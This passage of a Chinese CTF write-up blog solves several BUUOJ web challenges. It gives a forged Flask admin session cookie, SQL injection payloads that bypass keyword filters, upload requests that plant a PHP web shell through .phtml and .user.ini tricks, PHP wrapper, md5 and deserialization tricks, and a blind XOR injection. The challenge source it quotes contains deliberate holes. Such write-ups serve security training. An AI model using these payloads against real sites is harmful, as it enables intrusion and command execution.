class="string">&quot;.eJw9kMGKwkAQRH9lmbOHJOpF8KBMHBS6g2GSMH0R10STHtuFqKgR_32zLngu6vGqnmqzb6tzrSaX9loN1KYp1eSpvr7VRJFZNMB-hMVy6DhtsFt54COjJQ8mFzTZg-xhCDq-O4EO7LxBm0WOZxFEKaPEIXbQkeQe7ezmoj_OiqFYh2hLn-jUYwEPlIUQ50yyvqHGGjmvMcrGqLOQjAuIfYCSjVwUP0inApwf-y47W9bQoZC4qXoN1O7c7jeXH1-dPhMSs-yoQAZDNQkE1OslFm6JyY8Q9Wp6ziC5gIY7FfHY9Rqwnr5xjWwP1Ye00xQns__ktJU-UGEYqoG6nqv2_ZoKA_X6BbWIa8E.X4VwIA.Rkin6-MMArxsGd_I2z5Ub0AaWjg&quot;</span></span><br><span class="line">-s跟secret_key -c跟session</span><br><span class="line">解得&#123;<span class="string">&#x27;_fresh&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;_id&#x27;</span>: <span class="string">b&#x27;dab2985b7b4b72d29c56d0ef4e2e87011bc310b556b063dc6a5733fed500cb7b2c1d557d84d5c26aff5cfd043a65a7e9455df4f946e8ca2d4f25e84ca7a33fff&#x27;</span>, <span class="string">&#x27;csrf_token&#x27;</span>: <span class="string">b&#x27;8b3ecc0fafc4e569308ee3c3d0c2ef031ea9b5c1&#x27;</span>, <span class="string">&#x27;image&#x27;</span>: <span class="string">b&#x27;p6D8&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;user_id&#x27;</span>: <span class="string">&#x27;10&#x27;</span>&#125;</span><br><span class="line">修改对应值为admin</span><br><span class="line">python3 flask_session_cookie_manager3.py encode -s ckj123 -t <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;dab2985b7b4b72d29c56d0ef4e2e87011bc310b556b063dc6a5733fed500cb7b2c1d557d84d5c26aff5cfd043a65a7e9455df4f946e8ca2d4f25e84ca7a33fff&#x27;, &#x27;csrf_token&#x27;: b&#x27;8b3ecc0fafc4e569308ee3c3d0c2ef031ea9b5c1&#x27;, &#x27;image&#x27;: b&#x27;p6D8&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span></span><br><span class="line">加密得到.eJw9kMGKwkAQRH9lmbOHJOpF8KBMHBS6g2GSMH0R10STHtuFqKgR_32zLngu6vGqnmqzb6tzrSaX9loN1KYp1eSpvr7VRJFZNMB-hMVy6DhtsFt54COjJQ8mFzTZg-xhCDq-O4EO7LxBm0WOZxFEKaPEIXbQkeQe7ezmoj_OiqFYh2hLn-jUYwEPlIUQ50yyvqHGGjmvMcrGqLOQjAuIfYCSjVwUP0inApwf-y47W9bQoZC4qXoN1O7c7jeXH1-dPhMSs-yoQAZDNQkE1OslFm6JyY8Q9Wp6ziC5gIY7FfHY9Rqwnr5xjWwP1Ye00xQns__ktJU-UNtSmpMaqOu5at-_qTBQr1-f7W03.X4VxOQ.KRA69X0skFKOV_aVoNryiWVok1w</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>过滤了union select or from这些，复写绕过就可以了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=admin1%<span class="number">27</span>uniunionon%<span class="number">20</span>selselectect%<span class="number">201</span>%<span class="number">2</span>C2%<span class="number">2</span>Cgroup_concat(schema_name)%<span class="number">20</span>frfromom%<span class="number">20</span>infoorrmation_schema.schemata%<span class="number">20</span>%<span class="number">23</span></span><br><span class="line">username=admin&amp;password=admin1%<span class="number">27</span>uniunionon%<span class="number">20</span>selselectect%<span class="number">201</span>%<span class="number">2</span>C2%<span class="number">2</span>Cgroup_concat(table_name)%<span class="number">20</span>frfromom%<span class="number">20</span>infoorrmation_schema.tables%<span class="number">20</span>whwhereere%<span class="number">20</span>table_schema%<span class="number">3</span>Ddatabase()%<span class="number">23</span></span><br><span class="line">username=admin&amp;password=admin1%<span class="number">27</span>uniunionon%<span class="number">20</span>selselectect%<span class="number">201</span>%<span class="number">2</span>C2%<span class="number">2</span>Cgroup_concat(column_name)%<span class="number">20</span>frfromom%<span class="number">20</span>infoorrmation_schema.columns%<span class="number">20</span>whwhereere%<span class="number">20</span>table_schema%<span class="number">3</span>Ddatabase()%<span class="number">20</span>anandd%<span class="number">20</span>table_name%<span class="number">3</span>D%<span class="number">27</span>b4bsql%<span class="number">27</span>%<span class="number">23</span></span><br><span class="line">username=admin&amp;password=admin1%<span class="number">27</span>uniunionon%<span class="number">20</span>selselectect%<span class="number">201</span>%<span class="number">2</span>C2%<span class="number">2</span>Cgroup_concat(passwoorrd)%<span class="number">20</span>frfromom%<span class="number">20</span>b4bsql%<span class="number">23</span></span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>后缀名绕过php,php3,php4,php5,phtml,pht</p><p>构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /upload_file.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: c887928f-<span class="number">75</span>ce-<span class="number">45</span>ce-<span class="number">9</span>fad-<span class="number">32</span>dd56874aa9.node3.buuoj.cn</span><br><span class="line">Content-Length: <span class="number">342</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//c887928f-75ce-45ce-9fad-32dd56874aa9.node3.buuoj.cn</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUpGgttuPSdHTxZgd</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">85.0</span>.<span class="number">4183.102</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Referer: http://c887928f-75ce-45ce-9fad-32dd56874aa9.node3.buuoj.cn/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryUpGgttuPSdHTxZgd</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;pnghead.phtml&quot;</span></span><br><span class="line"><span class="comment">Content-Type: image/png</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PNG</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;script language=&quot;php&quot;&gt;system($_GET[x]);&lt;/script&gt;</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryUpGgttuPSdHTxZgd</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">æäº¤</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryUpGgttuPSdHTxZgd--</span></span><br></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>源码index.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接取key=123</p><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>上传phtml绕过php后缀检查</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>正则r&#39;/ph|htaccess/i&#39;，没办法绕过，这里用上传.user.ini来处理，分别上传</p><p>.user.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: e049f518-c43e-<span class="number">4195</span>-<span class="number">8</span>a8c-<span class="number">1617</span>eb34e8c1.node3.buuoj.cn</span><br><span class="line">Content-Length: <span class="number">318</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//e049f518-c43e-4195-8a8c-1617eb34e8c1.node3.buuoj.cn</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuxoqRGYxpvd7xV8v</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">85.0</span>.<span class="number">4183.102</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Referer: http://e049f518-c43e-4195-8a8c-1617eb34e8c1.node3.buuoj.cn/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryuxoqRGYxpvd7xV8v</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;.user.ini&quot;</span></span><br><span class="line"><span class="comment">Content-Type: image/png</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PNG</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">auto_prepend_file=2.jpg</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryuxoqRGYxpvd7xV8v</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;upload&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">æäº¤</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryuxoqRGYxpvd7xV8v--</span></span><br></pre></td></tr></table></figure><p>2.jpg</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: e049f518-c43e-<span class="number">4195</span>-<span class="number">8</span>a8c-<span class="number">1617</span>eb34e8c1.node3.buuoj.cn</span><br><span class="line">Content-Length: <span class="number">340</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//e049f518-c43e-4195-8a8c-1617eb34e8c1.node3.buuoj.cn</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuxoqRGYxpvd7xV8v</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">85.0</span>.<span class="number">4183.102</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Referer: http://e049f518-c43e-4195-8a8c-1617eb34e8c1.node3.buuoj.cn/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryuxoqRGYxpvd7xV8v</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;2.jpg&quot;</span></span><br><span class="line"><span class="comment">Content-Type: image/png</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PNG</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;script language=&quot;php&quot;&gt;system($_GET[x]);&lt;/script&gt;</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryuxoqRGYxpvd7xV8v</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;upload&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">æäº¤</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryuxoqRGYxpvd7xV8v--</span></span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /pay.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">63</span>c15e7b-<span class="number">97</span>d2-<span class="number">4281</span>-<span class="number">830e-0</span>e314c5a4573.node3.buuoj.cn</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">85.0</span>.<span class="number">4183.102</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6</span></span><br><span class="line"><span class="comment">Cookie: user=1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 23</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">password=404a&amp;money=1e9</span></span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>知识点1</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/md5.png"></p><p>指定true的时候可以用到拼接，ffifdyop的md5($str1, true)后返回形如&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c，拼接后就</p><p>select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</p><p>知识点2</p><p>php双等号弱类型QNKCDZO，s155964671a，s1091221200a</p><p>知识点3</p><p>md5函数如果传递给它的是一个数组，会返回FALSE</p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</p><p>说的是php://input也可以但是实际上不行 读出来会包含变量名</p><p>利用file=php://filter/convert.base64-encode/resource=useless.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单的反序列化，给$file赋值就行</p><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbuser</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbpass</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">#被过滤的内容 函数基本没过滤</span></span><br><span class="line">    <span class="variable">$blackList</span> = <span class="keyword">array</span>(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;||&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;or&#x27;</span>,<span class="string">&#x27;and&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&#x27;group&#x27;</span>,<span class="string">&#x27;limit&#x27;</span>,<span class="string">&#x27;update&#x27;</span>,<span class="string">&#x27;delete&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;load_file&#x27;</span>,<span class="string">&#x27;outfile&#x27;</span>,<span class="string">&#x27;./&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blackList</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(stripos(<span class="variable">$sql</span>,<span class="variable">$blackitem</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$db</span> = mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$db</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(mysql_error());</span><br><span class="line">&#125;   </span><br><span class="line">mysql_select_db(<span class="string">&quot;ctf&quot;</span>,<span class="variable">$db</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(safe(<span class="variable">$id</span>))&#123;</span><br><span class="line">    <span class="variable">$query</span> = mysql_query(<span class="string">&quot;SELECT content from passage WHERE id = $&#123;id&#125; limit 0,1&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$query</span>)&#123;</span><br><span class="line">        <span class="variable">$result</span> = mysql_fetch_array(<span class="variable">$query</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Error Occured When Fetch Result.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        var_dump(<span class="variable">$query</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;SQL Injection Checked.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是一个trick</p><p>1^1^1，用它可以起到代替or的作用。</p><p>0^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)</p><p>但还有一些是没有用异或，用的是if，可if有局限性，在id为数字型时，可以直接 select * from users where id=if(1=1,1,0)，但如果id单引号字符型或双引号字符型，那就必须在if前加or或and</p><p>python脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 